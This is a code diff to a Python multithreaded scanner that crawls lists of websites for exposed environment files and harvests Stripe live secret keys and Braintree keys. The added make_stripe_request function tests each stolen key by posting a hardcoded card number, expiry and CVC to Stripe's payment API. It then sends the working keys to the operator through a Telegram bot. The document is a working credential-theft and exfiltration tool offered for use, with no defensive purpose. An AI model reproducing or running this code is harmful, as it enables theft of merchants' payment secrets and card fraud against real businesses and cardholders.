@@ -40,16 +40,45 @@ class ENV:
                     matches = re.findall(pattern, resp)
                     for match in matches:
                         sk_live = f"sk_live_{match}"
-                        print("Found matching content:", sk_live)
-                        requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={sk_live}&parse_mode=HTML")
+                        self.make_stripe_request(sk_live)
                 if "BRAINTREE_PUBLIC_KEY" in resp:
                     with open('Braintree.txt', 'a') as file_object:
                         file_object.write(f'Braintree : {url}\n')
             else:
                 rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
-        except:
-            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
+        except Exception as e:
+            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url} - {e}'
         print(rr)
+
+    def make_stripe_request(self, sk_live_key):
+        url = "https://api.stripe.com/v1/payment_methods"
+        data = {
+            "type": "card",
+            "card[number]": "5178058714350744",
+            "card[exp_month]": "01",
+            "card[exp_year]": "2027",
+            "card[cvc]": "263"
+        }
+        headers = {
+            "Authorization": f"Bearer {sk_live_key}"
+        }
+        response = requests.post(url, data=data, headers=headers)
+        if response.status_code == 200:
+            response_json = response.json()
+            if "id" in response_json:
+                message = f"Live sk : {sk_live_key}"
+                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful with id")
+            else:
+                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful without id")
+        elif response.status_code == 401 and "api_key_expired" in response.text:
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} API key expired")
+        elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
+            message = f"sk integration off : {sk_live_key}"
+            requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Integration off: {sk_live_key}")
+        else:
+            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Request failed: {response.status_code} - {response.text}")
 
 if __name__ == '__main__':
     os.system('clear')
@@ -59,7 +88,7 @@ if __name__ == '__main__':
 ██║   ██║██████╔╝██║         ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
 ██║   ██║██╔══██╗██║         ██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
 ╚██████╔╝██║  ██║███████╗    ██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
- ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
+ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝  ╚══════╝╚═╝  ╚═╝
                                                                                                 
 
   \u001B[0m""")
@@ -72,17 +101,21 @@ if __name__ == '__main__':
         try:
             thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
             break
-        except:
-            pass
+        except ValueError:
+            print("Invalid input. Please enter an integer.")
+
     while True:
         try:
             inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
             with open(inpFile) as urlList:
                 argFile = urlList.read().splitlines()
             break
-        except:
-            pass
+        except FileNotFoundError:
+            print("File not found. Please enter a valid file path.")
+
     with ThreadPoolExecutor(max_workers=thrd) as executor:
+        env_scanner = ENV()
         for data in argFile:
-            threads.append(executor.submit(ENV().scan, data))
+            threads.append(executor.submit(env_scanner.scan, data))
+
     quit()
